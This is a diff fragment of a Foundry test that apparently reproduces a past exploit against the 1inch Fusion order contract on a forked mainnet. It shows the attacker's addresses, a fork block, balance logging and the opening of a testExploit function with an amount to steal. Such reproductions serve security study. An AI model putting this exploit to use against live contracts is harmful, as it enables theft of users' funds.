@@ -68,7 +68,7 @@ struct Order {
     bytes interactions; // concat(makerAssetData, takerAssetData, getMakingAmount, getTakingAmount, predicate, permit, preIntercation, postInteraction)
 }
 
-contract ONEINCH is BaseTestWithBalanceLog {
+contract ONEINCH is Test {
     uint256 blocknumToForkFrom = 21982110;
 
     address ATTACK_DEPLOYER = 0xA7264a43A57Ca17012148c46AdBc15a5F951766e;
@@ -86,14 +86,13 @@ contract ONEINCH is BaseTestWithBalanceLog {
 
     function setUp() public {
         vm.createSelectFork("mainnet", blocknumToForkFrom);
-        fundingToken = USDC;
         // Log balances of attacker contract pre-attack (needs very little to start the attack)
         console.log("Attacker Contract USDC Balance: ", TokenHelper.getTokenBalance(USDC, ATTACK_CONTRACT));
         console.log("Attacker Contract USDT Balance: ", TokenHelper.getTokenBalance(USDT, ATTACK_CONTRACT));
 
     }
 
-    function testExploitOneInchFusion() public {
+    function testExploit() public {
 
         uint256 AMOUNT_TO_STEAL = 0xE8D4A51000; // 1M
         bytes1 _CONTINUE_INTERACTION = 0x00;
